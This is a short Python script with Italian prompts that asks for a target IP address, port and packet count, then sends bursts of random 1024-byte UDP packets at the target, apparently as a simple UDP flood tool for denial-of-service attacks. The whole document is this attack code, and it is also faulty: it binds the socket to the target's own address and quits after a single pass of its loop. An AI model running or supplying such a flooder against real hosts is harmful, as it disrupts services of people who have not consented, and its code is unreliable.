import socket 
import random

target_IP = input ("Inserisci l'indirizzo IP della macchina target: ")
port = int (input ("Inserisci il numero della porta da attaccare: "))

numero_pacchetti = int (input ("Inserisci la quantità di pacchetti UDP da inviare: "))

while 1:

        s = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
        s.bind ((target_IP, port))
        UDP_data = random.randbytes(1024)
        print ("SERVER STARTED - LET'S GOOOOOOOOOOOO")
        address = str(target_IP), int(port)
        for x in range (numero_pacchetti):
                s.sendto (UDP_data, address)
        s.close()
        quit()

